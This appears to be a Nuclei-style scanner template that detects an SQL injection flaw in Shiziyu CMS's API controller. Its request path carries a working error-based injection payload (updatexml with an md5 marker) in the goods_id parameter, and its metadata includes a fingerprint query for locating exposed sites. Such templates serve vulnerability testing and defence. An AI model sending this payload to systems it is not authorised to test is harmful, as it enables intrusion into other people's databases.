id: shiziyu-cms-apicontroller-sqli
info:
  name: Shiziyu CMS Api Controller - SQL Injection
  author: SleepingBag945
  severity: high
  description: |
    Shiziyu CMS ApiController.class.php parameter filtering is not rigorous, resulting in SQL injection vulnerability.
  classification:
    cwe-id:
      - CWE-89
  metadata:
    runzero-match: any(each(service["http.bodies"]), {# matches "(?i)/seller\\.php\\?s=/Public/login"})
    fofa-query: body="/seller.php?s=/Public/login"
    max-request: 1
    verified: true
  tags: sqli,vuln
variables:
  num: "999999999"
http:
  - matchers:
      - part: body
        type: word
        words:
          - c8c605999f3d8352d7bb792cf3fdb25
      - status:
          - 404
        # digest: 490a00463044022077f94ac9cc0a8398187eefc566bd3ea918834dbb58d0c54cebdb402942d62a4402205f4cc1a45964f87e2d318b72c2bd203ad8054403826690a124123e657a430c48:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)'
